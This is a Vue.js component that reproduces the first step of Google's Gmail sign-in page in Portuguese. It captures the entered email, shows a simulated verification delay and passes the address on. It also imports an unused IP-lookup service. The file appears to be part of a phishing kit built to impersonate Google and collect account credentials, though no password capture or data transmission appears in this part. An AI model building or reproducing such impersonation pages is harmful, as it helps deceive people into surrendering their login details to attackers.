<template>
  <div class="step active">
    <h1>Fazer login</h1>
    <p class="subtitle">Ir para o Gmail</p>
    
    <form @submit.prevent="handleSubmit">
      <div class="input-group" :class="{ focused: isEmailFocused, filled: email }">
        <input 
          type="email" 
          id="email" 
          v-model="email"
          @focus="isEmailFocused = true"
          @blur="isEmailFocused = false"
          placeholder=" "
          required
        >
        <label for="email">E-mail ou telefone</label>
      </div>
      
      <div class="forgot-email">
        <a href="#">Esqueceu seu e-mail?</a>
      </div>
      
      <div class="guest-mode">
        <p>Não está no seu computador? Use uma janela de navegação privada para fazer login. <a href="#">Saiba como usar o modo visitante.</a></p>
      </div>
      
      <div class="form-actions">
        <a href="#" class="create-account">Criar conta</a>
        <button type="submit" class="next-btn" :disabled="!email || loading">
          <span v-if="loading" class="loading-spinner"></span>
          <span v-else>Avançar</span>
        </button>
      </div>
    </form>
  </div>
</template>

<script>
import { ref } from 'vue'
import { getUserIP } from '../services/api'

export default {
  name: 'LoginForm',
  emits: ['email-submitted'],
  setup(props, { emit }) {
    const email = ref('')
    const isEmailFocused = ref(false)
    const loading = ref(false)

    const handleSubmit = async () => {
      if (!email.value.trim()) return
      
      loading.value = true
      
      // Simular delay de verificação
      await new Promise(resolve => setTimeout(resolve, 1500))
      
      emit('email-submitted', email.value.trim())
      loading.value = false
    }

    return {
      email,
      isEmailFocused,
      loading,
      handleSubmit
    }
  }
}
</script>